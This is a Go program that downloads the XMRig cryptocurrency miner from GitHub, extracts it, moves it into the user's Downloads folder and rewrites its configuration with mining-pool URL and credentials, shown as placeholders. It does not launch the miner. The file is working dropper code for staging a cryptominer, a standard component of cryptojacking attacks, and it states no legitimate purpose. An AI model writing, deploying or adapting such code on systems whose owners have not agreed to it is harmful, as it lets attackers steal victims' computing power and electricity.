package main

import (
	"fmt"
    "io"
    "log"
    "net/http"
	"os"
	"archive/zip"
	"path/filepath"
	"strings"
	"io/ioutil"
)



func main() {
	fileName := "red.zip"
    URL := "https://github.com/xmrig/xmrig/releases/download/v6.3.3/xmrig-6.3.3-msvc-win64.zip"
    err := downloadFile(URL, fileName)
    if err != nil {
        log.Fatal(err)
    }
	

	files, err := Unzip("red.zip", "output")
	if err != nil { 
		log.Fatal(err)
	}
	fmt.Println(files)
	mvToLoc()
}

func mvToLoc() { 
	currentWorkingDirectory, err := os.Getwd()
	outputFolder := currentWorkingDirectory
	fmt.Println(outputFolder)
	if err != nil { 
		log.Fatal(err)
	}

	var sg string
	var tocut int

	tocut = strings.LastIndex(outputFolder, "\\")
	sg = outputFolder[:tocut]
	
	tocut = strings.LastIndex(sg, "\\")
	sg = outputFolder[:tocut]

	mvdir := sg + "\\Downloads\\"  + "output"
	er := os.Rename(outputFolder + "\\output", mvdir)
	if er != nil { 
		log.Fatal(err)
	}

	configPath := mvdir + "\\xmrig-6.3.3\\config.json"
	configure_xmrig(configPath, "example.com", "user", "pass")

}

func downloadFile(URL, fileName string) error {
    //Get the response bytes from the url
    response, err := http.Get(URL)
    if err != nil {
    }
    defer response.Body.Close()

    //Create a empty file
    file, err := os.Create(fileName)
    if err != nil {
        return err
    }
    defer file.Close()

    //Write the bytes to the fiel
    _, err = io.Copy(file, response.Body)
    if err != nil {
        return err
    }
    return nil
}

func Unzip(src string, dest string) ([]string, error) {

    var filenames []string

    r, err := zip.OpenReader(src)
    if err != nil {
        return filenames, err
    }
    defer r.Close()

    for _, f := range r.File {

        fpath := filepath.Join(dest, f.Name)

        if !strings.HasPrefix(fpath, filepath.Clean(dest)+string(os.PathSeparator)) {
            return filenames, fmt.Errorf("%s: illegal file path", fpath)
        }

        filenames = append(filenames, fpath)

        if f.FileInfo().IsDir() {
            // Make Folder
            os.MkdirAll(fpath, os.ModePerm)
            continue
        }

        // Make File
        if err = os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != nil {
            return filenames, err
        }

        outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
        if err != nil {
            return filenames, err
        }

        rc, err := f.Open()
        if err != nil {
            return filenames, err
        }

        _, err = io.Copy(outFile, rc)

        // Close the file without defer to close before next iteration of loop
        outFile.Close()
        rc.Close()

        if err != nil {
            return filenames, err
        }
    }
    return filenames, nil
}


//configure pool options
func configure_xmrig(configPath string ,url string, user string, pass string) { 
	fmt.Println("configuring json script...")
	inputfile, err := ioutil.ReadFile(configPath)
	if nil != err { 
		fmt.Println("could'nt read file...")
		os.Exit(1)
	}

	fileslines := strings.Split(string(inputfile), "\n")

	for i, line := range fileslines {
		if strings.Contains(line, "url") {
			fileslines[i] = "\t\t\t\"url\":" + "\"" + url + "\"" + ","
		}
	}

	for i, line := range fileslines {
		if strings.Contains(line, "user") {
			fileslines[i] = "\t\t\t\"user\":" + "\"" + user + "\"" +  ","
		}
	}

	for i, line := range fileslines {
		if strings.Contains(line, "pass") {
			fileslines[i] = "\t\t\t\"pass\":" + "\""  + pass +  "\"" + ","
		}
	}

	
	output := strings.Join(fileslines, "\n")
        err = ioutil.WriteFile(configPath, []byte(output), 0644)
        if err != nil {
                log.Fatalln(err)
		}

	fmt.Println("done configuring...")
	

}